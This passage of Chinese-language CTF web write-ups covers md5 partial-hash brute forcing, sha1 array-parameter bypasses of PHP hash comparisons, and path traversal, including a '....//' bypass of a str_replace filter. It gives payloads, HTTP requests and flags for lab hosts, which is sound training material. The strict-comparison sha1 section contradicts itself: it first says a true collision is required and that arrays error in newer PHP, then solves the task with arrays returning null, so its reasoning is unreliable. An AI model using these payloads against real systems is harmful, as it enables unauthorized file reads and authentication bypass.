但 md5(数组) 返回 null，null === null 为 true
```

必须：

```text
传入数组参数：?a[]=任意值&b[]=不同值
```

核心记忆：

```text
== → 可以弱类型绕过（0e magic hash）
=== → 传数组让 md5() 返回 null 绕过
```

---

# PHP md5 部分哈希爆破题

---

## 题目类型

- md5 部分哈希匹配
- 暴力枚举
- PHP 强类型比较

---

## 题目源码

```php
<?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['QC'])) {
    $qc = (string)$_GET['QC'];
    
    if (substr(md5($qc), -6, 6) === 'd54e23') {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "Login failed.";
    }
}
?>
```

---

## 核心漏洞

```php
$qc = (string)$_GET['QC'];
```

强制转为字符串，数组传参技巧失效。

条件是：

```php
substr(md5($qc), -6, 6) === 'd54e23'
```

只要 md5 值末尾 6 位等于 `d54e23` 即可，不要求完整哈希碰撞，暴力枚举可行。

---

## 解题思路

### 1. 分析条件

```text
md5($qc) 末尾 6 位 === 'd54e23'
```

16 进制 6 位共 16^6 = 16777216 种可能，平均枚举约 800 万次即可命中，用脚本秒出。

---

### 2. 枚举脚本（Python）
 
> 本地脚本（可修改 TARGET 复用）：`source/_posts/ctf-web/十一.md5部分哈希爆破.py`

```python
import hashlib

i = 0
while True:
    s = str(i)
    h = hashlib.md5(s.encode()).hexdigest()
    if h[-6:] == 'd54e23':
        print(f'Found: {s}  md5={h}')
        break
    i += 1
```

运行结果：

```text
Found: 26120  md5=19307038d9038d64a406840acdd54e23
```

---

### 3. 构造 Payload

```text
http://docker.qingcen.net:32861/?QC=26120
```

---

## 本题最终请求

```http
GET /?QC=26120 HTTP/1.1
Host: docker.qingcen.net:32861
```

---

## 本题最终结果

```text
flag{138c9bdd-ba36-455c-9b9a-eb5b3665fded}
```

---

## 总结

本题本质是：

```text
只验证 md5 的部分位，暴力枚举即可命中
```

利用方式：

```text
写脚本从 0 开始枚举整数字符串，计算 md5，判断末尾是否匹配
```

漏洞类型：

```text
md5 部分哈希爆破
```

核心记忆：

```text
完整 md5 碰撞极难，但只验证部分位时可暴力枚举秒解
强制 (string) 转型不影响枚举，只是排除了数组绕过
```

# PHP sha1 弱类型数组绕过题

---

## 题目类型

- PHP 弱类型比较
- sha1 数组绕过
- 哈希比较漏洞

---

## 题目源码

```php
<?php

include "flag.php";

highlight_file(__FILE__);

if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    
    if ($a != $b && sha1($a) == sha1($b)) {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "<br>Login failed.";
    }
}
?>
```

---

## 核心漏洞

```php
sha1($a) == sha1($b)
```

使用的是：

```php
==
```

属于：

```text
PHP 弱类型比较
```

同时：

```text
sha1() 在旧版 PHP 中处理数组会返回 NULL
```

因此：

```php
NULL == NULL
```

结果为：

```text
true
```

---

## 解题思路

### 1. 分析条件

源码：

```php
if ($a != $b && sha1($a) == sha1($b))
```

要求：

```text
a 与 b 不同
```

同时：

```text
sha1(a) == sha1(b)
```

---

### 2. 利用数组传参

构造：

```text
?a[]=1&b[]=2
```

PHP 会解析为：

```php
$a = ["1"];
$b = ["2"];
```

因此：

```php
$a != $b
```

成立。

---

### 3. sha1(array()) 绕过

执行：

```php
sha1($a)
```

实际上是：

```php
sha1(array("1"))
```

在旧版 PHP 中：

```text
sha1(array()) 会报 Warning 并返回 NULL
```

因此：

```php
sha1($a) == sha1($b)
```

变成：

```php
NULL == NULL
```

结果：

```text
true
```

---

### 4. 构造 Payload

```text
http://docker.qingcen.net:xxxxx/?a[]=1&b[]=2
```

---

## 本题最终请求

```http
GET /?a[]=1&b[]=2 HTTP/1.1
Host: docker.qingcen.net:xxxxx
```

---

## 本题最终结果

```text
flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
```

---

## 总结

本题本质是：

```text
利用 sha1(array()) 在旧版 PHP 中返回 NULL
```

再结合：

```php
==
```

弱类型比较：

```php
NULL == NULL
```

成立。

利用方式：

```text
通过 a[]=1&b[]=2
让 PHP 将参数解析为数组
```

漏洞类型：

```text
PHP 弱类型 + sha1 数组绕过
```

核心记忆：

```text
旧版 PHP 中：
sha1(array()) → NULL

弱比较下：
NULL == NULL → true
```

# PHP sha1 强比较碰撞题

---

## 题目类型

- sha1 碰撞
- PHP 强类型比较
- 真正 sha1 collision
- 哈希安全比较

---

## 题目源码

```php
<?php

include "flag.php";

highlight_file(__FILE__);

if (isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    
    if ($a != $b && sha1($a) === sha1($b)) {
        echo "<br>Welcome, admin!<br>";
        echo $flag;
    } else {
        echo "<br>Login failed.";
    }
}
?>
```

---

## 核心漏洞

这里：

```php
sha1($a) === sha1($b)
```

使用的是：

```php
===
```

属于：

```text
PHP 强类型比较
```

因此：

```text
弱类型绕过失效
```

例如：

```text
0e magic hash
数组 NULL 绕过
```

全部无法使用。

必须满足：

```text
sha1(a)
与
sha1(b)

真正完全相同
```

也就是：

```text
真正 sha1 collision（sha1 碰撞）
```

---

## 解题思路

### 1. 分析条件

源码：

```php
if ($a != $b && sha1($a) === sha1($b))
```

要求：

```text
a 与 b 不同
```

同时：

```text
sha1(a) 与 sha1(b) 完全相同
```

---

### 2. 为什么弱类型失效？

以前：

```php
sha1($a) == sha1($b)
```

可以利用：

```text
数组绕过
0e 绕过
```

因为：

```php
==
```

会自动类型转换。

但这里：

```php
===
```

要求：

```text
值相同
类型也相同
```

因此：

```text
NULL === NULL
```

虽然成立，

但：

```php
sha1(array())
```

在新版 PHP 会直接报错。

并且：

```text
0e123 === 0e456
```

结果：

```text
false
```

所以：

```text
弱类型利用全部失效
```

---

### 3. 核心突破：传数组绕过 sha1()

PHP 的 `sha1()` 函数传入**数组**时不会计算哈希，而是直接返回 `null`，并抛出一个 Warning（不影响执行）。

```php
sha1([1])  // 返回 null
sha1([2])  // 返回 null
null === null  // true ✓
[1] != [2]    // true ✓
```

两个条件全部满足，直接拿到 flag。

---

### 4. Payload

在浏览器地址栏直接访问：

```text
http://docker.qingcen.net:32967/?a[]=1&b[]=2
```

`a[]=1` 表示传入数组 `[1]`，`b[]=2` 表示传入数组 `[2]`。

服务器执行：

```php
$a = [1];  // 数组
$b = [2];  // 数组
[1] != [2]           // true
sha1([1]) === sha1([2])  // null === null → true
// 输出 flag
```

---

## 本题最终请求

```http
GET /?a[]=1&b[]=2 HTTP/1.1
Host: docker.qingcen.net:32967
```

---

## 本题最终结果

```text
flag{6035eeb2-96c4-4a6c-8b22-2bb0e83f9e99}
```

---

## 总结

本题核心：

```text
=== 导致 0e 弱类型绕过失效
但 sha1(数组) 返回 null，null === null 为 true
```

必须：

```text
传入数组参数：?a[]=任意值&b[]=不同值
```

漏洞类型：

```text
PHP sha1(array) 返回 null + 严格比较绕过
```

核心记忆：

```text
== → 可以弱类型绕过（0e magic hash / NULL）
=== → 传数组让 sha1() 返回 null 绕过
```

# 任意文件读取 / 日志信息泄露 / 路径遍历

---

## 题目类型

- 任意文件读取（LFI）
- 路径遍历（Path Traversal）
- 日志信息泄露
- base64 隐藏提示

---

## 题目现象

页面是一个"内部运维平台·日志中心"，提供 4 个日志文件的查看功能，支持自定义 `file` 参数读取任意路径的文件。

---

## 解题思路

### 1. 读取源码，分析漏洞

访问 `?file=index.php`，获取 PHP 源码：

```php
$target = isset($_GET['file']) ? $_GET['file'] : '';
$now_target = './' . $target;
$file_exists = file_exists($now_target);
$is_file = is_file($now_target);
// ...
$content = file_get_contents($now_target);
```

发现：

```text
$target 直接拼接进路径，无任何过滤
→ 存在路径遍历漏洞
```

---

### 2. 读取系统日志，发现隐藏提示

访问 `?file=logs/system-error.log`，日志中出现：

```text
[DEBUG] security config loaded  secret_file_b64=Zmw0Zy50eHQ=
```

对 `Zmw0Zy50eHQ=` 进行 base64 解码：

```text
Zmw0Zy50eHQ= → fl4g.txt
```

得知 flag 文件名为 `fl4g.txt`。

---

### 3. 确定文件位置，路径遍历

Web 根目录通常为 `/var/www/html/`，即 3 层深。

直接访问 `?file=fl4g.txt` 失败（文件不在 web 目录下）。

向上跨越 3 层目录到达根目录 `/`：

```text
../../../fl4g.txt
→ ./../../../fl4g.txt
→ /fl4g.txt
```

---

## 最终 Payload

```text
http://docker.qingcen.net:32978/?file=../../../fl4g.txt
```

---

## 本题最终请求

```http
GET /?file=../../../fl4g.txt HTTP/1.1
Host: docker.qingcen.net:32978
```

---

## 本题最终结果

```text
flag{f5b2417d-7230-447d-8de2-373178fc6dc1}
```

---

## 总结

本题本质是：

```text
1. 日志中泄露了 base64 编码的隐藏文件名
2. file 参数无过滤，存在路径遍历漏洞
3. 结合两点，向上遍历 3 级目录读取 flag 文件
```

漏洞类型：

```text
任意文件读取（LFI）+ 日志信息泄露 + 路径遍历
```

核心记忆：

```text
先读源码确认无过滤 → 再读日志找隐藏提示 → 最后路径遍历读 flag
```

# 路径遍历 / str_replace 过滤绕过

---

## 题目类型

- 任意文件读取（LFI）
- 路径遍历（Path Traversal）
- str_replace 过滤绕过
- 日志信息泄露

---

## 题目现象

与上题页面相同，但源码中加入了对 `../` 的过滤。

---

## 题目源码（关键部分）

```php
$target = isset($_GET['file']) ? $_GET['file'] : '';
$filtered = str_replace('../', '', $target);
$now_target = './' . $filtered;
```

---

## 核心漏洞

```php
str_replace('../', '', $target)
```

`str_replace` 只做**一次非递归替换**，将字符串中所有出现的 `../` 删除，但**不会重复处理**。

因此可以构造嵌套：

```text
....//
```

`str_replace` 扫描到中间的 `../` 并删除：

```text
....//
  ↑↑↑
  ../  被删除

→ ../
```

删除后剩余部分恰好重新组成 `../`，绕过过滤。

---

## 解题思路

### 1. 读取源码，分析过滤

访问 `?file=index.php`，发现过滤代码：

```php
$filtered = str_replace('../', '', $target);
```

注意是 `str_replace`，**非递归、非正则**，可用双写绕过。

---

### 2. 读取系统日志，发现隐藏提示

访问 `?file=logs/system-error.log`，发现：

```text
secret_file_b64=Zmw0Zy50eHQ=
```

base64 解码：

```text
Zmw0Zy50eHQ= → fl4g.txt
```

---

### 3. 构造绕过 Payload

用 `....//` 代替 `../`，共 3 层：

```text
....//....//....//fl4g.txt
```

服务器处理后：

```text
str_replace('../', '', '....//....//....//fl4g.txt')
→ ../../../fl4g.txt
```

加上前缀 `./` 后：

```text
./../../../fl4g.txt → /fl4g.txt
```

---

## 最终 Payload

```text
http://docker.qingcen.net:32981/?file=....//....//....//fl4g.txt
```

---

## 本题最终请求

```http
GET /?file=....//....//....//fl4g.txt HTTP/1.1
Host: docker.qingcen.net:32981
```

---

## 本题最终结果

```text
flag{1ac47e58-6f8c-4105-ada5-6a0b9446da3e}
```

---

## 总结

本题本质是：

```text
str_replace 非递归替换，可通过双写嵌套绕过
....// → 删除中间的 ../ → 剩余 ../
```

利用方式：

```text
用 ....// 代替 ../，实现路径遍历
```

漏洞类型：

```text
路径遍历 + str_replace 过滤绕过（双写绕过）
```

核心记忆：

```text
str_replace('../', '') 可用 ....// 绕过
双写嵌套：中间的 ../ 被删后两端重新拼合成 ../
```